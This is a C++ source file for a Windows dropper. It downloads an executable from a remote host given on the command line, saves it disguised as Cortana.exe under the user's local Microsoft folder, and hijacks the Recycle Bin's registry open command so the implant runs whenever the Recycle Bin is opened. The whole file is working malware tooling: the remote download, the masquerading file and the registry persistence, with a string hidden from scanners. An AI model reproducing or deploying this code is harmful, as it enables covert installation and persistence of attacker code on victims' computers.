#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <vector>
#include <winhttp.h>
#include <Ip2string.h>
#pragma comment(lib, "Ntdll.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)


#pragma comment(lib, "winhttp")


int Error(const char* msg) {
    printf("%s (%u)", msg, GetLastError());
    return 1;
}

EXTERN_C NTSTATUS NtCreateFile(
    PHANDLE            FileHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK   IoStatusBlock,
    PLARGE_INTEGER     AllocationSize,
    ULONG              FileAttributes,
    ULONG              ShareAccess,
    ULONG              CreateDisposition,
    ULONG              CreateOptions,
    PVOID              EaBuffer,
    ULONG              EaLength
);

EXTERN_C NTSTATUS NtWriteFile(
    HANDLE           FileHandle,
    HANDLE           Event,
    PIO_APC_ROUTINE  ApcRoutine,
    PVOID            ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID            Buffer,
    ULONG            Length,
    PLARGE_INTEGER   ByteOffset,
    PULONG           Key
);

struct PE {

    LPVOID pPE;
    DWORD size;

};

char* EnVariable(char* variable) {
    char lpName[MAX_PATH];
    char lpBuffer[MAX_PATH];
    DWORD  nSize = MAX_PATH;
    if (!GetEnvironmentVariableA(variable, lpBuffer, nSize)) {
        printf("[-] Failed in GetEnvironmentVariableA (%u)\n", GetLastError());
        return NULL;
    }

    return lpBuffer;
}

BOOL mkdir(const char* dirName) {

    BOOL successC = CreateDirectoryA(dirName, NULL);
    if (!successC) {
        return FALSE;
    }

    return TRUE;
}

BOOL Persiste(LPVOID ImageBase, DWORD ImageSize, const char* path) {

    NTSTATUS status1;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK osb;
    UNICODE_STRING fileName;
    HANDLE fHandle;


    char realPath[MAX_PATH];
    memset(realPath, '\0', MAX_PATH);
    lstrcatA(realPath, "\\??\\");
    lstrcatA(realPath, path);
    lstrcatA(realPath, "\\Cortana.exe");


    const size_t cSize = strlen(realPath) + 1;
    wchar_t* wpath = new wchar_t[cSize];
    mbstowcs(wpath, realPath, cSize);



    RtlInitUnicodeString(&fileName, (PCWSTR)wpath);
    ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));
    InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);


    status1 = NtCreateFile(&fHandle, FILE_GENERIC_WRITE, &oa, &osb, 0, FILE_ATTRIBUTE_NORMAL, 0,
        FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    if (!NT_SUCCESS(status1)) {
        printf("[!] Failed in NtCreateFile (%u)\n", GetLastError());
        return FALSE;
    }

    NTSTATUS status2;
    IO_STATUS_BLOCK osb2;
    ZeroMemory(&osb2, sizeof(IO_STATUS_BLOCK));


    
    status2 = NtWriteFile(fHandle, NULL, NULL, NULL, &osb, (PVOID)ImageBase, ImageSize, NULL, NULL);

    if (!NT_SUCCESS(status2)) {
        printf("[!] Failed in NtWriteFile (%u)\n", GetLastError());
        return FALSE;
    }

    printf("[+] Implant dropped in Cortona Folder \n");

    HKEY hkey = NULL;

    // open registery key 
    LSTATUS resOpen = RegOpenKeyExA(HKEY_CLASSES_ROOT, "CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell", 0, KEY_WRITE, &hkey);
    if (resOpen != ERROR_SUCCESS) {
        printf("[!] Failed in RegOpenKeyEx (%u)\n", GetLastError());
        return FALSE;
    }
    else {
        printf("[+] Handle Opened to \"HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\"\n");
    }


    HKEY hkResult;
    DWORD dwDisposition;

    // create subkey
    LSTATUS resCreate = RegCreateKeyExA(hkey, "open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS,
        NULL, &hkResult, &dwDisposition);
    if (resCreate != ERROR_SUCCESS) {
        printf("[!] Failed in RegCreateKeyExA (%u)\n", GetLastError());
        return FALSE;
    }

    printf("[+] Subkey \"open\\command\" created\n");

    char exePath[MAX_PATH];
    memset(exePath, '\0', MAX_PATH);
    lstrcatA(exePath, "\"");
    lstrcatA(exePath, path);
    lstrcatA(exePath, "\\Cortana.exe\"");

    HKEY hkey2 = NULL;

    LSTATUS resOpen2 = RegOpenKeyExA(HKEY_CLASSES_ROOT, "CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command", 0, KEY_WRITE, &hkey2);
    if (resOpen2 != ERROR_SUCCESS) {
        printf("[!] Failed in RegOpenKeyEx2 (%u)\n", GetLastError());
        return FALSE;
    }

    // create registery key
    LSTATUS reSet = RegSetValueExA(hkey2, NULL, 0, REG_SZ, (unsigned char*)exePath, strlen(exePath));
    if (reSet != ERROR_SUCCESS) {
        printf("[!] Failed in RegSetValueEx (%u)\n", GetLastError());
        return FALSE;
    }
    else {
        printf("[+] Modify its value to Our Implant path\n");
    }

    RegCloseKey(hkey);
    RegCloseKey(hkey2);

    return TRUE;
}


PE GetPE(wchar_t* whost, DWORD port, wchar_t* wresource) {
    struct PE pe;
    std::vector<unsigned char> PEbuf;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = NULL;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);


    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, whost,
            port, 0);
    else
        printf("Failed in WinHttpConnect (%u)\n", GetLastError());

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", wresource,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            NULL);
    else
        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    else
        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {

                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);

                }
                delete[] pszOutBuffer;

            }

        } while (dwSize > 0);

        if (PEbuf.empty() == TRUE)
        {
            printf("Failed in retrieving the PE");
        }


        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        size_t size = PEbuf.size();
        //printf("size : %d\n", size);
        char* my_PE = (char*)malloc(size);
        for (int i = 0; i < PEbuf.size(); i++) {
            my_PE[i] = PEbuf[i];
        }
        pe.pPE = my_PE;
        pe.size = size;
        return pe;
}

BOOL DirectoryExists(LPCSTR szPath){
    DWORD dwAttrib = GetFileAttributesA(szPath);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
        (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

int main(int argc, char** argv) {
    
    // Validate the parameters
    if (argc != 4) {
        printf("[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\n", argv[0]);
        return 1;
    }
    char* host = argv[1];
    DWORD port = atoi(argv[2]);
    char* resource = argv[3];

    const size_t cSize1 = strlen(host) + 1;
    wchar_t* whost = new wchar_t[cSize1];
    mbstowcs(whost, host, cSize1);


    const size_t cSize2 = strlen(resource) + 1;
    wchar_t* wresource = new wchar_t[cSize2];
    mbstowcs(wresource, resource, cSize2);

    PE pe = GetPE(whost, port, wresource);
    printf("\n[+] Getting Implant from %s:%d\n", host, port);

    char path[MAX_PATH];
    char LOCALAPPDATA[] = { 'L','O','C','A','L','A','P','P','D','A','T','A',0 };
    memset(path, '\0', MAX_PATH);
    lstrcatA(path, EnVariable(LOCALAPPDATA));
    lstrcatA(path, "\\Microsoft\\Cortana");


    if (DirectoryExists(path)) {
        printf("[!] Cortona Folder already exist !\n");
    }
    else {
        if (!mkdir(path)) {
            printf("[-] Failed in making Cortana dir (%u)\n", GetLastError());
            return -1;
        }
        printf("[+] Creating Cortona Folder\n");
    }
    

    Persiste(pe.pPE, pe.size, path);
   

    return 0;

}



